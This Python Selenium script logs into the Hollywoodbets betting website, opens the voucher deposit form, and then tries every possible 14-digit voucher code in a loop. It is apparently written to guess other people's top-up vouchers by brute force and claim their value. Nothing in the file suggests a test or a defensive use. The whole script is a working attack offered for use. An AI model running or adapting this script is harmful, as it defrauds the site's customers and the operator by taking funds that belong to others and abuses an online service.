from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.wait import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

import selenium
import itertools
import time
import sys
import os


driver = webdriver.Firefox()
driver.get("https://www.hollywoodbets.net/betting")


def navigate_to_login_page():
    try:
        
        login_btn_location = '/html/body/app-root/header/div/div[2]/app-login/div[1]/ul/li[1]/a'
        login_btn = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, login_btn_location))
        )

    except selenium.common.exceptions.TimeoutException:
        print("Could not locate login page")
        driver.quit()
        sys.exit()

    login_btn.click()


def user_authenticate():
    try:
        
        username = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.ID, "Username"))
        )

        password = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.ID, "password"))
        )

    except selenium.common.exceptions.TimeoutException:
        print("Could not locate login modal!")
        driver.quit()
        sys.exit()


    user = os.environ.get("user") # export pasw=<password>

    pasw = os.environ.get("pass") # export user=<phone number>

    username.send_keys(user)
    password.send_keys(pasw)

    password.send_keys(Keys.RETURN)


def navigate_to_deposit():
    try:
        deposit_location = '/html/body/app-root/header/div/div[2]/app-login/div[1]/ul/li[4]/h5/a[2]'
        deposit_btn = WebDriverWait(driver, 30).until(
            EC.presence_of_element_located((By.XPATH, deposit_location))
        )

    except selenium.common.exceptions.TimeoutException:
        print("Could not locate deposit btn!")
        driver.quit()
        sys.exit()

    deposit_btn.click()


def switch_to_frame():
    try:
        
        iframe = WebDriverWait(driver, 10).until(
            EC.presence_of_element_located((By.XPATH, "//iframe[contains(@src, 'https://voucher.hollywoodbets.net?DevicePlatform=NewWeb&ClientId=12361542')]"))
        )

    except selenium.common.exceptions.TimeoutException:
        print("Could not could not switch frame")
        driver.quit()
        sys.exit()

    driver.switch_to.frame(iframe)


def top_up(generated_code):
    # driver.refresh()
    
    try:
        easy_load_location = '/html/body/main/section/article/form/section/div[1]/button[2]'
        easy_load_btn = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.XPATH, easy_load_location))
        )

        voucher_input = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.ID, "VoucherNumber"))
        )

        # btnSubmit
        voucher_submit = WebDriverWait(driver, 20).until(
            EC.presence_of_element_located((By.ID, "btnSubmit"))
        )


    except selenium.common.exceptions.TimeoutException:
        print("Could not locate easyload btn and input!")
        driver.quit()
        sys.exit()

    easy_load_btn.click()
    voucher_input.send_keys(Keys.CONTROL + "a")
    voucher_input.send_keys(generated_code)
    voucher_submit.click()


def main():
    navigate_to_login_page()
    user_authenticate()
    navigate_to_deposit()
    navigate_to_deposit()
    switch_to_frame()

    combinations = "2640319758"

    possible_combinations = itertools.product(combinations, repeat=14)

    for combination in possible_combinations:
        generated_code = "".join(combination)
        top_up(generated_code)
        time.sleep(6)


if __name__ == "__main__":
    main()